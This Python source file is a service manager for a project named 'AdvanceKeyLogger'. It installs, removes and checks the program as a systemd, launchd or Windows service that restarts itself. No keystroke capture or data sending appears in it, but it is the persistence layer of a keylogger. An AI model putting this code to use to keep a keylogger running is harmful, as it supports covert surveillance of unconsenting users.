"""
Cross-platform service manager.
"""
from __future__ import annotations

import os
from dataclasses import dataclass
from pathlib import Path
from typing import Any

from utils.system_info import get_platform

from service.linux_systemd import SystemdManager
from service.macos_launchd import LaunchdManager
from service.windows_service import WindowsServiceManager


@dataclass
class ServiceSpec:
    name: str
    description: str
    config_path: str
    restart_sec: int
    start_limit_burst: int
    start_limit_interval: int
    display: str


class ServiceManager:
    """Facade for platform-specific service operations."""

    def __init__(self, config: dict[str, Any]) -> None:
        self._config = config
        self._spec = self._build_spec()
        self._platform = get_platform()

    def install(self) -> str:
        manager = self._get_manager()
        return manager.install(self._spec)

    def uninstall(self) -> str:
        manager = self._get_manager()
        return manager.uninstall(self._spec)

    def status(self) -> str:
        manager = self._get_manager()
        return manager.status(self._spec)

    def _build_spec(self) -> ServiceSpec:
        service_cfg = self._config.get("service", {})
        name = str(service_cfg.get("name", "advancekeylogger"))
        description = str(
            service_cfg.get("description", "AdvanceKeyLogger Monitoring Service")
        )
        config_path = service_cfg.get("config_path") or ""
        if not config_path:
            config_path = os.path.expanduser(
                str(self._config.get("config_path", "~/.config/advancekeylogger/config.yaml"))
            )
        restart_sec = int(service_cfg.get("restart_sec", 10))
        start_limit_burst = int(service_cfg.get("start_limit_burst", 3))
        start_limit_interval = int(service_cfg.get("start_limit_interval", 60))
        display = str(service_cfg.get("display", ":0"))
        return ServiceSpec(
            name=name,
            description=description,
            config_path=str(Path(config_path).expanduser()),
            restart_sec=restart_sec,
            start_limit_burst=start_limit_burst,
            start_limit_interval=start_limit_interval,
            display=display,
        )

    def _get_manager(self):
        if self._platform == "linux":
            return SystemdManager()
        if self._platform == "darwin":
            return LaunchdManager()
        if self._platform == "windows":
            return WindowsServiceManager()
        raise RuntimeError(f"Unsupported platform: {self._platform}")
